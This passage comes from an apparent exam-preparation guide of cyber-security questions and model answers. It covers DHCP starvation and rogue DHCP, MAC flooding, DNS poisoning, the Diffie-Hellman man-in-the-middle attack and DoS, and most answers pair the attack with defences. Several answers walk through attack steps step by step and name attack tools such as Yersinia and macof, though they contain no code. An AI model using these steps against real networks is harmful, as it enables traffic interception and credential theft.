   - A DDoS attack is the same thing launched simultaneously from a botnet of thousands of compromised machines, which makes it far larger and far harder to filter, since each source looks like an ordinary user.
   - Damage: loss of service and revenue, reputational harm, and sometimes use as a distraction while another attack proceeds.
   - Prevention: rate limiting, SYN cookies, a Web Application Firewall, a DDoS scrubbing service or CDN, anycast distribution, over-provisioned bandwidth, and coordination with the upstream ISP, since a volumetric attack must be stopped upstream of the victim's own link.
7. **How to attack DHCP server in MIMA?** *[Titas Gas Assistant Engineer (CSE) 24.05.2024 compact it 416 (ET: BUET)]*


   Answer: A DHCP server can be attacked in a Man in the Middle scenario in two complementary ways: by starving the legitimate server, and by introducing a rogue one.

   Step 1, DHCP starvation:
   - The attacker floods the legitimate DHCP server with DHCPDISCOVER messages, each carrying a different spoofed MAC address, using a tool such as Yersinia or dhcpstarv.
   - The server reserves and then leases an address for each request. Within a short time the entire scope is exhausted and the server can serve nobody.
   - This alone is a denial of service, since new clients receive no address.

   Step 2, rogue DHCP server:
   - With the legitimate server unable to answer, the attacker runs his own DHCP server on the same segment.
   - Every new client, and every client whose lease expires, now receives its configuration from the attacker.
   - The attacker sets himself as the default gateway, and usually as the DNS server as well.

   Step 3, the Man in the Middle position:
   - The victim now sends all traffic destined for other networks to the attacker's machine, believing it to be the router.
   - The attacker enables IP forwarding, so the traffic still reaches the Internet and the victim notices nothing.
   - He can now capture credentials sent over unencrypted protocols, perform SSL stripping, inject content, redirect the victim through a poisoned DNS answer, or simply drop the traffic.

   ```
   Normal:   Client --DHCP--> Legitimate server --> Gateway --> Internet

   Attack:   Step 1: Client flood exhausts the legitimate server's pool
             Step 2: Rogue server answers instead
             Step 3: Client --> Attacker (fake gateway) --> Gateway --> Internet
   ```

   Prevention:
   - DHCP snooping on the switches: ports are marked trusted or untrusted, and DHCP server messages, that is OFFER and ACK, are dropped on untrusted ports, so a rogue server cannot answer at all. This is the primary defence.
   - Port security, limiting the number of MAC addresses learned on a port, which stops the starvation flood, since it depends on many spoofed MAC addresses appearing on one port.
   - Dynamic ARP Inspection, which uses the DHCP snooping binding table to reject forged ARP as well.
   - 802.1X port based authentication, so an unauthorised device never joins the network.
   - Rate limiting DHCP messages per port.
   - Monitoring for unexpected DHCP servers and for a sudden fall in the available address pool.
   - Encryption everywhere, so that even a successful interception yields nothing readable.
8. **Let you procure a microfinance application and host it in your office's data centre. What kind of cyber-security threats should you be aware of and what steps would you take to mitigate the threats?** *[Combined Bank Senior Officer (IT) 17.05.2024 compact it 332 (ET: BIBM)]*


   Answer:

   Cyber security threats to be aware of when hosting a microfinance application in the office data centre:

   Application layer threats:
   - SQL injection, cross site scripting, cross site request forgery and insecure direct object references, all of which can expose or alter customer and loan data.
   - Broken authentication and session management, allowing account takeover.
   - Insecure APIs, particularly if a mobile application or an agent device connects to the system.
   - Vulnerabilities in the third party components and libraries the vendor has used, which is a supply chain risk.
   - Business logic flaws, for example manipulating a repayment or a disbursement amount.

   Data threats:
   - Theft of personally identifiable information and financial records, which for a microfinance institution means the details of very large numbers of low income customers.
   - Data at rest unencrypted on disks and backups, so that a stolen drive or tape exposes everything.
   - Data in transit unencrypted between branches, agents and the data centre.
   - Insider misuse by staff with legitimate access, which is statistically one of the largest risks in a financial institution.

   Infrastructure threats:
   - Ransomware encrypting the database and the backups, which is the single most damaging scenario.
   - Malware and advanced persistent threats establishing a long term foothold.
   - DDoS attacks making the service unavailable at month end when collections are due.
   - Unpatched operating systems, databases and network devices.
   - Weak or default credentials on servers, databases and network equipment.
   - Rogue DHCP, ARP spoofing and lateral movement within the internal network.
   - Physical threats: unauthorised access to the server room, theft, fire and power failure.

   Human and process threats:
   - Phishing and social engineering aimed at staff and at the vendor's support engineers.
   - Excessive privileges and orphaned accounts of departed staff.
   - Poor change management, so that an untested change causes an outage or opens a hole.
   - Vendor and third party access left permanently open.

   Steps to mitigate the threats:

   Before procurement and deployment:
   - Require a security assessment of the application: source code review or at least an independent penetration test, and evidence of secure development practice from the vendor.
   - Put security requirements in the contract: patching obligations, vulnerability disclosure, data ownership, an exit plan and audit rights.
   - Verify compliance with Bangladesh Bank ICT security guidelines and, where cards are involved, PCI DSS.

   Network and infrastructure:
   - Segment the network: place the application in a DMZ, the database in a separate protected zone, and the office LAN elsewhere, with firewalls between them so that a compromise in one does not reach the others.
   - Deploy a next generation firewall, a web application firewall in front of the application, and an intrusion detection and prevention system.
   - Restrict administrative access to a jump host with multi-factor authentication, and never expose the database directly to the Internet.
   - Harden every server: remove unnecessary services, close unused ports, disable default accounts and apply a security baseline.

   Data protection:
   - Encrypt data in transit with TLS 1.2 or 1.3 everywhere, including internal traffic between branches and the data centre.
   - Encrypt data at rest: full disk encryption, database encryption of sensitive columns, and encrypted backups.
   - Manage keys properly, ideally in a hardware security module, and rotate them.
   - Mask or tokenise sensitive data in test and development environments.

   Identity and access:
   - Enforce least privilege and role based access control, and review entitlements quarterly.
   - Multi-factor authentication for all administrative and remote access.
   - Strong password policy, and privileged access management with session recording for administrators.
   - Remove accounts immediately when staff leave, and give vendor accounts time limited access only.

   Operations:
   - Patch management with a defined cycle for the operating system, the database, the application and the network devices, and emergency patching for critical vulnerabilities.
   - Backups following the 3-2-1 rule, with at least one copy immutable or offline so that ransomware cannot encrypt it, and regular restore tests.
   - Centralised logging and a SIEM, with alerting for privileged actions, failed logins and data exports.
   - 24 hour monitoring, and an incident response plan that has actually been rehearsed.
   - A disaster recovery site with defined RPO and RTO, and periodic DR drills.

   People and governance:
   - Security awareness training and simulated phishing for all staff, including field officers.
   - Segregation of duties, dual authorisation for disbursements and for changes to bank details.
   - Regular vulnerability scanning and an annual independent penetration test.
   - An information security policy, a risk register and periodic internal and external audit.
   - Physical security of the data centre: access control, CCTV, fire suppression, UPS and generator.

   - The governing principle to state: defence in depth. No single control is sufficient, so layered technical, procedural and human controls are used, and the assumption is that a breach will eventually occur, which is why detection, response and tested recovery matter as much as prevention.
9. **Write down the 10 most Cyber attacks. Difference among Black Hat hacker, Grey hat hacker and white hat hacker.** *[Sonali & Janata Bank Officer (IT) 14.10.2023 compact it 526 (ET: MIST)]*


   Answer:

   Top 10 cyber attacks:
   - Phishing and social engineering: fraudulent messages that trick a user into revealing credentials or opening a malicious file. It is the entry point of most breaches.
   - Malware: viruses, worms, Trojans, spyware and rootkits that damage, steal or take control.
   - Ransomware: malware that encrypts the victim's data and demands payment for the key. It has become the most damaging category for organisations.
   - Denial of Service and Distributed Denial of Service: flooding a service so that legitimate users cannot reach it.
   - Man in the Middle: intercepting traffic between two parties to read or alter it, through ARP spoofing, DNS spoofing or a rogue access point.
   - SQL injection: inserting malicious SQL through an input field to read, alter or destroy the database.
   - Cross Site Scripting, XSS: injecting a script into a web page so that it runs in another user's browser and steals their session.
   - Password attacks: brute force, dictionary, credential stuffing using passwords leaked elsewhere, and keylogging.
   - Zero day exploit: attacking a vulnerability for which no patch yet exists.
   - Insider threat: a current or former employee misusing legitimate access, whether maliciously or negligently.
   - Others worth naming: DNS poisoning, supply chain attacks, advanced persistent threats, IoT botnets, cryptojacking, and the drive-by download.

   | Point | Black hat hacker | Grey hat hacker | White hat hacker |
   |---|---|---|---|
   | Intent | Malicious: theft, damage, extortion or espionage | Mixed; usually curiosity or reputation rather than harm | Constructive: to find and fix weaknesses |
   | Authorisation | None | None; the systems are entered without permission | Full written authorisation from the owner |
   | Legality | Illegal | Illegal, even when the intention is not harmful | Legal |
   | Discloses findings | No, or sells them | Usually reports them afterwards, sometimes asking a fee | Yes, through a formal report to the owner |
   | Motive | Money, ideology, revenge, espionage | Curiosity, recognition, sometimes payment | Employment, contract, bug bounty |
   | Typical activity | Stealing data, deploying ransomware, building botnets | Scanning systems uninvited and then reporting the flaw | Penetration testing, vulnerability assessment, red teaming |
   | Also called | Cracker | — | Ethical hacker |

   - The distinction that matters legally is authorisation, not intent: a grey hat who breaks in with good intentions has still committed an offence under the Digital Security Act and equivalent laws elsewhere. The correct route for a well intentioned researcher is a bug bounty programme or responsible disclosure with prior permission.
10. **What is Cyber Security? Write down the top 10 cyber attack. Discuss about Ransomware and DDoS attack.** *[Combined Bank Senior Officer (IT) 13.10.2023 compact it 512 (ET: MIST)]*


   Answer:

   What cyber security is:
   - Cyber security is the practice of protecting computers, networks, programs and data from unauthorised access, damage, disruption or theft. Its three core objectives are the CIA triad: confidentiality, integrity and availability.
   - Its domains: network security, application security, endpoint security, identity and access management, data security and cryptography, cloud security, operational security, incident response and disaster recovery, and user awareness.

   Top 10 cyber attacks:
   - Phishing and social engineering: fraudulent messages that trick a user into revealing credentials or opening a malicious file. It is the entry point of most breaches.
   - Malware: viruses, worms, Trojans, spyware and rootkits that damage, steal or take control.
   - Ransomware: malware that encrypts the victim's data and demands payment for the key. It has become the most damaging category for organisations.
   - Denial of Service and Distributed Denial of Service: flooding a service so that legitimate users cannot reach it.
   - Man in the Middle: intercepting traffic between two parties to read or alter it, through ARP spoofing, DNS spoofing or a rogue access point.
   - SQL injection: inserting malicious SQL through an input field to read, alter or destroy the database.
   - Cross Site Scripting, XSS: injecting a script into a web page so that it runs in another user's browser and steals their session.
   - Password attacks: brute force, dictionary, credential stuffing using passwords leaked elsewhere, and keylogging.
   - Zero day exploit: attacking a vulnerability for which no patch yet exists.
   - Insider threat: a current or former employee misusing legitimate access, whether maliciously or negligently.
   - Others worth naming: DNS poisoning, supply chain attacks, advanced persistent threats, IoT botnets, cryptojacking, and the drive-by download.

   Ransomware:
   - Ransomware is malware that encrypts the victim's files and demands a payment, usually in cryptocurrency, in exchange for the decryption key.
   - How it arrives: a phishing attachment or link, an exploited unpatched vulnerability such as in RDP or a VPN appliance, a compromised supply chain update, or a drive-by download.
   - How it works: it gains a foothold, escalates privileges, spreads laterally across the network, deliberately deletes shadow copies and backups, and only then encrypts the data on every reachable system, leaving a ransom note.
   - Double extortion, which is now standard: the data is stolen before it is encrypted, so the attacker threatens to publish it as well, which defeats the defence of simply restoring from backup.
   - Examples: WannaCry in 2017, which spread through the EternalBlue SMB vulnerability; NotPetya; Ryuk; LockBit; and the Ransomware as a Service model, in which affiliates rent the malware.
   - Defence: offline or immutable backups tested by restoration, prompt patching, disabling or protecting RDP, email filtering, endpoint detection and response, network segmentation to limit lateral movement, least privilege, multi-factor authentication and user training. Paying the ransom is discouraged, since it funds the crime and does not guarantee recovery.

   DDoS attack:

   - A Denial of Service attack aims to make a service unavailable to its legitimate users, by exhausting some finite resource: bandwidth, connection table entries, CPU, memory or application threads. It does not steal data; it destroys availability, which is one third of the CIA triad.
   - A Distributed Denial of Service attack is the same thing launched simultaneously from many compromised machines, called a botnet, which may number in the hundreds of thousands and be spread across the world.

   | Point | DoS | DDoS |
   |---|---|---|
   | Source | A single machine and a single IP address | Thousands of machines and IP addresses |
   | Traffic volume | Limited by the attacker's own connection | Can reach terabits per second |
   | Detection | Comparatively easy; the pattern comes from one source | Very difficult; each source looks like an ordinary user |
   | Mitigation | Block the offending IP address | Blocking individual addresses is useless; scrubbing services and rate limiting are required |
   | Tracing the attacker | Possible | Very hard, since the real attacker only commands the botnet |
   | Impact | Moderate | Severe; it can remove a large service entirely |

   Types of attack:
   - Volumetric: UDP flood, ICMP flood and amplification attacks using DNS, NTP or memcached, in which a small forged request produces a very large reply directed at the victim.
   - Protocol attacks: SYN flood, which fills the connection table with half open connections; ping of death; Smurf attack.
   - Application layer attacks: HTTP flood, Slowloris, which holds connections open with partial requests, and expensive database queries repeated endlessly. These use very little bandwidth and are the hardest to detect.

   Mitigation:
   - Rate limiting and connection limits, SYN cookies, and traffic filtering at the edge.
   - A Web Application Firewall and an Intrusion Prevention System.
   - A DDoS scrubbing service or CDN such as Cloudflare or Akamai, which absorbs and filters the traffic before it reaches the origin.
   - Anycast, which spreads the traffic across many sites.
   - Over-provisioned bandwidth, autoscaling and load balancing.
   - Blackhole and sinkhole routing, and coordination with the upstream ISP, which is essential because a volumetric attack must be stopped upstream of the victim's own link.
   - Monitoring with alert thresholds and a rehearsed incident response plan.
11. **What is meant by Encryption and Decryption? What is Cyber security? Write down the top 10 cyber attack.** *[Combined Bank Assistant Maintenance Engineer/ Assistant Hardware Engineer 23.11.2023 compact it 557 (ET: BIBM)]*


   Answer:

   Encryption and decryption:
   - Encryption is the process of converting readable plaintext into unreadable ciphertext using an algorithm and a key, so that anyone intercepting it cannot understand it. Decryption is the reverse, converting the ciphertext back into the plaintext with the appropriate key.
   - Formulas: C = E(P, K) and P = D(C, K).
   - Types: symmetric, using one shared key, which is fast and used for bulk data, with algorithms such as AES and 3DES; and asymmetric, using a public key to encrypt and a private key to decrypt, which is slower but solves key distribution and enables digital signatures, with algorithms such as RSA and ECC.
   - Purpose: confidentiality above all, and with authenticated modes also integrity. It is what makes online banking, e-commerce, VPNs and secure messaging possible.

   What cyber security is:
   - Cyber security is the protection of computers, networks, programs and data from unauthorised access, damage or disruption. Its objectives are the CIA triad: confidentiality, integrity and availability, to which authentication and non-repudiation are often added.
   - It covers network, application, endpoint, data, cloud and physical security, together with identity management, monitoring, incident response and user awareness.

   Top 10 cyber attacks:
   - Phishing and social engineering: fraudulent messages that trick a user into revealing credentials or opening a malicious file. It is the entry point of most breaches.
   - Malware: viruses, worms, Trojans, spyware and rootkits that damage, steal or take control.
   - Ransomware: malware that encrypts the victim's data and demands payment for the key. It has become the most damaging category for organisations.
   - Denial of Service and Distributed Denial of Service: flooding a service so that legitimate users cannot reach it.
   - Man in the Middle: intercepting traffic between two parties to read or alter it, through ARP spoofing, DNS spoofing or a rogue access point.
   - SQL injection: inserting malicious SQL through an input field to read, alter or destroy the database.
   - Cross Site Scripting, XSS: injecting a script into a web page so that it runs in another user's browser and steals their session.
   - Password attacks: brute force, dictionary, credential stuffing using passwords leaked elsewhere, and keylogging.
   - Zero day exploit: attacking a vulnerability for which no patch yet exists.
   - Insider threat: a current or former employee misusing legitimate access, whether maliciously or negligently.
   - Others worth naming: DNS poisoning, supply chain attacks, advanced persistent threats, IoT botnets, cryptojacking, and the drive-by download.
12. **Difference between active and passive atack.** *[BEPZA Programmer 03.11.2023 compact it 562 (ET: N/A)]*


   Answer:

   | Point | Active attack | Passive attack |
   |---|---|---|
   | Action | The attacker alters the data or the system | The attacker only observes; nothing is changed |
   | Goal | To affect integrity and availability | To violate confidentiality |
   | Detection | Comparatively easy, since something visibly changes | Very difficult, since there is no trace |
   | Prevention | Hard to prevent absolutely; the emphasis is on detection and recovery | Preventable, by encryption |
   | Harm to the victim | Immediate and visible | Delayed, and often discovered only when the stolen data is used |
   | System resources affected | Yes | No |
   | Examples | Masquerade, replay, message modification, denial of service, session hijacking, SQL injection, malware | Eavesdropping and sniffing, traffic analysis, packet capture, shoulder surfing |
   | Countermeasures | Digital signatures, message authentication codes, intrusion detection, firewalls, timestamps and nonces against replay | Encryption in transit and at rest, VPN, traffic padding, physical security of the medium |

   - The security principle behind the distinction: a passive attack is prevented, because once the data is encrypted the eavesdropper gains nothing; an active attack is detected and recovered from, because an attacker with access to the medium cannot be stopped from injecting traffic, only from doing so undetectably.
13. **Describe a man-in the middle attack on the Diffie-Hellman key exchange protocol in which the adversary generates two public key pairs for the attack.** *[Bangladesh Bank Assistant Programmer 03.02.2023 compact it 434 (ET: BIBM)]*


   Answer: The Diffie-Hellman key exchange agrees a shared secret over a public channel, but in its basic form it authenticates neither party, which is exactly the weakness the attack exploits.

   Normal Diffie-Hellman:
   - Alice and Bob agree publicly on a large prime p and a generator g.
   - Alice chooses a secret a and sends A = gᵃ mod p.
   - Bob chooses a secret b and sends B = g^b mod p.
   - Alice computes the shared key K = B^a mod p, and Bob computes K = A^b mod p. Both obtain g^(ab) mod p.
   - An eavesdropper who sees p, g, A and B cannot compute g^(ab) without solving the discrete logarithm problem.

   The man in the middle attack, in which the adversary generates two key pairs:
   - Step 1: the attacker, Mallory, positions herself between Alice and Bob so that all messages pass through her, for example by ARP spoofing or by controlling a router.
   - Step 2: Mallory generates two secrets of her own, m1 for the conversation with Alice and m2 for the conversation with Bob, and computes M1 = g^m1 mod p and M2 = g^m2 mod p.
   - Step 3: Alice sends A = gᵃ mod p intended for Bob. Mallory intercepts it and does not forward it. She sends M1 to Alice instead, pretending it came from Bob.
   - Step 4: Bob sends B = g^b mod p intended for Alice. Mallory intercepts it and sends M2 to Bob, pretending it came from Alice.
   - Step 5: Alice computes K1 = M1^a mod p = g^(a·m1) mod p, believing this is a secret shared with Bob. Mallory computes the same value as A^m1 mod p.
   - Step 6: Bob computes K2 = M2^b mod p = g^(b·m2) mod p, believing this is a secret shared with Alice. Mallory computes the same value as B^m2 mod p.
   - Step 7: two separate secure channels now exist, Alice to Mallory with key K1 and Mallory to Bob with key K2. Neither Alice nor Bob has any way of detecting this, because the mathematics worked perfectly in each case.
   - Step 8: when Alice sends a message, Mallory decrypts it with K1, reads or alters it, re-encrypts it with K2 and forwards it to Bob, and vice versa. She has complete visibility and complete control.

   ```
   Alice  --- A = g^a --->  [ Mallory ]  --- M2 = g^m2 --->  Bob
   Alice  <-- M1 = g^m1 ---  [ Mallory ]  <--- B = g^b -----  Bob

   Alice's key K1 = g^(a·m1)        Bob's key K2 = g^(b·m2)
   Mallory knows both K1 and K2, so she reads and alters everything.
   ```

   Why it succeeds:
   - Diffie-Hellman guarantees that a secret is shared with whoever is at the other end of the exchange, but it gives no assurance about who that is. Without authentication, the party at the other end may be the attacker.

   Prevention:
   - Authenticated Diffie-Hellman: each party signs its public value with its long term private key, and the other verifies the signature against a certificate. This is exactly what TLS does with ECDHE plus an RSA or ECDSA signature.
   - Digital certificates issued by a trusted Certifying Authority, and strict certificate validation by the client.
   - Station to Station protocol, which adds mutual authentication to Diffie-Hellman.
   - Pre-shared keys or a password authenticated key exchange where a PKI is not available.
   - Out of band verification of a key fingerprint, which is what secure messaging applications offer through a safety number.
   - The general lesson: key exchange without authentication is never sufficient, and every real protocol built on Diffie-Hellman adds an authentication step for precisely this reason.
14. **What is MAC flooding? How to prevent MAC flooding?** *[Teletalk Assistant Manager (IT) 2023 compact it 466 (ET: N/A)], [Telephone Shilpa Sangstha Ltd. (TSS) Assistant Programmer 2022 compact it 717 (ET: N/A)]*


   Answer:

   What MAC flooding is:
   - MAC flooding is an attack on a layer 2 switch in which the attacker sends an enormous number of frames with different forged source MAC addresses, in order to fill the switch's MAC address table, also called the CAM table.
   - The table has a finite size, typically a few thousand to a few tens of thousands of entries. Once it is full the switch cannot learn any new address.
   - A switch that cannot find a destination address in its table must flood the frame out of every port. So a switch with a full table behaves like a hub, sending every frame to every port.

   How the attack proceeds:
   - Step 1: the attacker connects to any port on the switch.
   - Step 2: using a tool such as macof, part of the dsniff suite, he generates thousands of frames per second, each with a random source MAC address.
   - Step 3: the switch learns each forged address against the attacker's port until the table is exhausted.
   - Step 4: legitimate entries age out and cannot be relearned, so the switch begins flooding.
   - Step 5: the attacker now receives a copy of traffic intended for other hosts and captures it with a packet sniffer.

   Impact on the switch and the network:
   - The switch degrades into a hub, so the confidentiality of the whole segment is lost and the attacker can capture credentials, session cookies and any unencrypted data.
   - Performance collapses, because every frame now goes to every port, and the available bandwidth on each port is consumed by traffic that does not belong there.
   - CPU and memory on the switch are exhausted, and it may become unmanageable or crash, causing a denial of service.
   - It is often the first step of a larger attack, providing the visibility needed for session hijacking or a man in the middle position.

   How to prevent MAC flooding:
   - Port security on the switch, which is the primary defence: limit the number of MAC addresses that may be learned on each access port, typically to one or two, and define the violation action as shutdown, restrict or protect. Sticky learning binds the first address seen to the port permanently.
   - 802.1X port based network access control, so that a device must authenticate before it can send any traffic at all.
   - Disable unused ports and place them in an unused VLAN.
   - VLAN segmentation, which limits the blast radius of a successful attack to one VLAN.
   - Dynamic ARP Inspection and DHCP snooping, which stop the follow-on attacks that MAC flooding enables.
   - Storm control and rate limiting on access ports.
   - Monitoring: alert on a rapid rise in MAC table entries or on repeated port security violations.
   - Encryption everywhere, so that even successful capture yields nothing readable. This is the defence of last resort and the most important one.
   - Physical security of network ports, so that an unauthorised device cannot be connected.
15. **What is Denial of Service (DoS) is and NAT?** *[NSDA Assistant Maintenance Engineer Date: 04-03-2022 compact it 659 (ET: N/A)]*


   Answer:

   Denial of Service:
   - A DoS attack aims to make a service unavailable to its legitimate users by exhausting a finite resource: bandwidth, connection table entries, CPU, memory or application threads. It attacks availability rather than confidentiality or integrity.
   - Types: volumetric attacks such as UDP and ICMP floods and amplification; protocol attacks such as the SYN flood, which fills the connection table with half open connections; and application layer attacks such as HTTP flood and Slowloris, which use very little bandwidth and are hardest to detect.
   - A DDoS attack is the same thing launched simultaneously from a botnet of many compromised machines, which makes the traffic far larger and the sources indistinguishable from ordinary users.
   - Mitigation: rate limiting, SYN cookies, a Web Application Firewall, a DDoS scrubbing service or CDN, anycast, over-provisioned bandwidth and coordination with the upstream ISP.

   NAT:
   - NAT, Network Address Translation, is the process by which a router rewrites the private IP address in a packet header into a public IP address, and performs the reverse on the return path.
   - It allows many hosts on a private network, using 10.0.0.0/8, 172.16.0.0/12 or 192.168.0.0/16, to share one or a few public addresses, which is what conserved the limited IPv4 space.
   - Types: static NAT, a fixed one to one mapping; dynamic NAT, allocated from a pool; and PAT or NAT overload, where many hosts share one public address and are distinguished by port number, which is what almost every home and office router does.
   - Security side effect: internal addresses are not visible from outside and unsolicited inbound connections are dropped, which gives a degree of protection, although NAT is not a substitute for a firewall.
   - Drawbacks: it breaks true end to end connectivity, complicates protocols that carry addresses in their payload such as FTP and SIP, requires port forwarding for inbound services, and makes logging and attribution harder. It is not needed in IPv6.
16. **What do you understand by DOS attack and Man-in-the-middle attack? Please explain how it can be occurred?** *[BPSC (Ministry of Home Affairs) Assistant Database Administrator (CSE) 2022 compact it 667 (ET: N/A)]*


   Answer:

   DoS attack:
   - A Denial of Service attack aims to make a service unavailable to its legitimate users by exhausting a finite resource: bandwidth, connection table entries, CPU, memory or application threads.

   How a DoS attack occurs:
   - SYN flood: the attacker sends a stream of TCP SYN packets with spoofed source addresses. The server replies SYN-ACK and reserves an entry in its connection table awaiting the final ACK, which never comes. The table fills with half open connections and legitimate users are refused.
   - Volumetric flood: UDP or ICMP packets are sent in sufficient volume to saturate the victim's link, so nothing else can get through.
   - Amplification: the attacker sends a small request to a DNS, NTP or memcached server with the victim's address forged as the source, and the very large reply is delivered to the victim. A small amount of attacker bandwidth produces a very large attack.
   - Application layer: Slowloris holds many connections open by sending partial HTTP requests very slowly, exhausting the server's connection pool with almost no bandwidth; an HTTP flood repeatedly requests an expensive page or query.
   - A DDoS attack is the same thing launched from a botnet of thousands of compromised machines, which multiplies the volume and hides the true source.

   Man in the middle attack:

   - A Man in the Middle attack is one in which the attacker secretly places himself between two communicating parties, so that all traffic passes through him. Each party believes it is talking directly to the other, while the attacker can read, record and alter everything.
   - It breaks confidentiality, integrity and authentication at once.

   How it is carried out:
   - ARP spoofing on a LAN: the attacker sends forged ARP replies so that the victim maps the gateway's IP to the attacker's MAC address, and the gateway maps the victim's IP to the attacker's MAC. All traffic then flows through the attacker.
   - DNS spoofing or cache poisoning: the attacker supplies a false IP address for a domain, so the victim connects to the attacker's server believing it to be the real one.
   - Rogue access point or evil twin: a fake Wi-Fi hotspot with a familiar name, to which victims connect voluntarily.
   - SSL stripping: the attacker downgrades an HTTPS connection to HTTP so the traffic is readable.
   - Session hijacking: stealing a session cookie and impersonating the authenticated user.
   - BGP hijacking and rogue DHCP servers, which redirect traffic at the network level.

   Countermeasures:
   - Strong encryption in transit: HTTPS with TLS 1.2 or 1.3 everywhere, so that even if the traffic is intercepted it cannot be read or altered. This is the single most effective measure.
   - Certificate validation and HSTS: the browser must verify the server's certificate against a trusted Certifying Authority, and HTTP Strict Transport Security prevents a downgrade to plain HTTP. Certificate pinning goes further by accepting only one specific certificate.
   - Mutual authentication: both sides prove their identity, as in mutual TLS and in IPsec with certificates, so an attacker cannot impersonate either end.
   - Dynamic ARP Inspection and DHCP snooping on switches, which block forged ARP and DHCP messages on the LAN, and port security to limit MAC addresses per port.
   - DNSSEC, which cryptographically signs DNS records so a forged answer is rejected.
   - VPN for any use of an untrusted network, so the whole session is encrypted end to end.
   - Multi-factor authentication, so that a stolen password alone is useless.
   - Avoiding open public Wi-Fi, and user awareness of certificate warnings, which should never be clicked through.
17. **What do you mean by a DNS poisoning attack, and how does it work?** *[GTCL Assistant Engineer (CSE) 2022 compact it 685 (ET: BUET)]*


   Answer: DNS poisoning, also called DNS cache poisoning or DNS spoofing, is an attack in which false information is inserted into a DNS resolver's cache, so that the resolver returns an incorrect IP address and directs users to a server controlled by the attacker.

   Why it is possible:
   - Classic DNS has no authentication of its answers. A resolver accepts a reply that matches the query name, the query type, the source and destination addresses and ports, and the 16 bit transaction ID. All of these can be guessed or forced.
   - Because the answer is cached for its TTL, a single successful poisoning affects every user of that resolver for hours.

   How it works:
   - Step 1: the attacker causes the target resolver to issue a query for a domain he controls the timing of, for example by requesting a name that is not in the cache.
   - Step 2: while the resolver waits for the authoritative server's reply, the attacker floods it with forged replies, each guessing a transaction ID and appearing to come from the legitimate name server.
   - Step 3: if one forged reply arrives before the genuine one and matches the transaction ID and port, the resolver accepts it and caches it.
   - Step 4: every user of that resolver who asks for the domain is now given the attacker's IP address.
   - Step 5: the users connect to a counterfeit site, where credentials are captured, or to a server that delivers malware.
   - The Kaminsky attack of 2008 refined this by poisoning the NS record of a whole domain rather than a single host, which hijacks everything under it at once.

   Other variants:
   - Compromising the authoritative name server directly, or the domain registrar account, and altering the records at source.
   - Modifying the victim's local `hosts` file, or the DNS settings supplied by a rogue DHCP server or a compromised home router.
   - Man in the middle interception of DNS queries on an untrusted network.

   ```
   Normal:   User -> Resolver -> Authoritative server -> real IP -> real site

   Poisoned: User -> Resolver (cache holds the attacker's IP) -> attacker's site
             The attacker's forged reply arrived first and was cached.
   ```

   Impact: credential theft through pharming, malware distribution, interception of email by poisoning MX records, censorship and traffic redirection, and loss of trust in the whole name resolution system. It is particularly dangerous because the user makes no mistake at all; the correct address was typed.

   Prevention:
   - DNSSEC, which cryptographically signs DNS records so that a forged answer fails validation. This is the fundamental fix.
   - Source port randomisation and transaction ID randomisation, which raise the difficulty of guessing enormously; this was the emergency mitigation after the Kaminsky disclosure.
   - DNS over TLS or DNS over HTTPS, which encrypt and authenticate the channel to the resolver.
   - Restricting recursion to internal clients only, so the resolver cannot be used or poisoned by outsiders.
   - Keeping DNS software patched, and separating the authoritative and recursive roles onto different servers.
   - Short TTL values for critical records, monitoring for unexpected answers, and registrar lock on the domain.
   - On the client side, HTTPS with strict certificate validation, since a poisoned address still cannot present a valid certificate for the real domain.
18. **Write down the difference between Active and Passive attack.** *[Microcredit Regulatory Authority (MRA) Assistant Maintenance Engineer 2022 compact it 719 (ET: N/A)]*


   Answer:

   | Point | Active attack | Passive attack |
   |---|---|---|
   | Action | The attacker alters the data or the system | The attacker only observes; nothing is changed |
   | Goal | To affect integrity and availability | To violate confidentiality |
   | Detection | Comparatively easy, since something visibly changes | Very difficult, since there is no trace |
   | Prevention | Hard to prevent absolutely; the emphasis is on detection and recovery | Preventable, by encryption |
   | Harm to the victim | Immediate and visible | Delayed, and often discovered only when the stolen data is used |
   | System resources affected | Yes | No |
   | Examples | Masquerade, replay, message modification, denial of service, session hijacking, SQL injection, malware | Eavesdropping and sniffing, traffic analysis, packet capture, shoulder surfing |
   | Countermeasures | Digital signatures, message authentication codes, intrusion detection, firewalls, timestamps and nonces against replay | Encryption in transit and at rest, VPN, traffic padding, physical security of the medium |

   - The security principle behind the distinction: a passive attack is prevented, because once the data is encrypted the eavesdropper gains nothing; an active attack is detected and recovered from, because an attacker with access to the medium cannot be stopped from injecting traffic, only from doing so undetectably.
19. **What is DHCP starvation and how DHCP starvation work with diagram? Write down the related attack introduced by DHCP starvation?** *[BDCCL Assistant Manager (Cyber Security) 14.10.2022 compact it 753 (ET: N/A)]*


   Answer:

   What DHCP starvation is:
   - DHCP starvation is a denial of service attack in which the attacker exhausts the entire pool of IP addresses held by a DHCP server, so that no legitimate client can obtain an address.
   - It exploits the fact that a DHCP server has no way of verifying the identity behind a request; it simply reserves an address for every DHCPDISCOVER it receives.

   How it works:
   - Step 1: the attacker connects to the network and runs a tool such as Yersinia, dhcpstarv or Gobbler.
   - Step 2: the tool sends a rapid stream of DHCPDISCOVER messages, each with a different randomly generated source MAC address, so that each appears to come from a new client.
   - Step 3: the server reserves an address and sends a DHCPOFFER for each request.
   - Step 4: the attacker replies with a DHCPREQUEST for each offer, so the server issues a DHCPACK and marks the address as leased.
   - Step 5: within seconds or minutes the entire scope is leased to addresses that do not exist, and the pool is exhausted.
   - Step 6: any genuine client that now boots or renews receives no reply and cannot join the network. On Windows it falls back to an APIPA address in 169.254.x.x and has no connectivity.

   ```mermaid
   sequenceDiagram
       participant A as Attacker
       participant S as DHCP Server
       participant V as Legitimate Client
       A->>S: DHCPDISCOVER with spoofed MAC 1
       S->>A: DHCPOFFER, address reserved
       A->>S: DHCPREQUEST
       S->>A: DHCPACK, address leased
       Note over A,S: repeated thousands of times with different MAC addresses
       Note over S: address pool exhausted
       V->>S: DHCPDISCOVER
       Note over V: no reply, no address, no connectivity
   ```

   Related attack introduced by DHCP starvation:
   - The rogue DHCP server attack, which is the real objective. Once the legitimate server can no longer answer, the attacker starts his own DHCP server on the same segment. Every client that now requests configuration receives it from the attacker.
   - The attacker sets himself as the default gateway and as the DNS server, so all traffic leaving the subnet passes through his machine. He enables IP forwarding so that everything still works and nothing appears wrong.
   - This gives a complete Man in the Middle position, from which he can capture credentials sent in clear, perform SSL stripping, redirect users through poisoned DNS answers, inject content, or drop traffic selectively.
   - So the chain is: DHCP starvation, then rogue DHCP server, then man in the middle, then credential theft or session hijacking.

   Prevention:
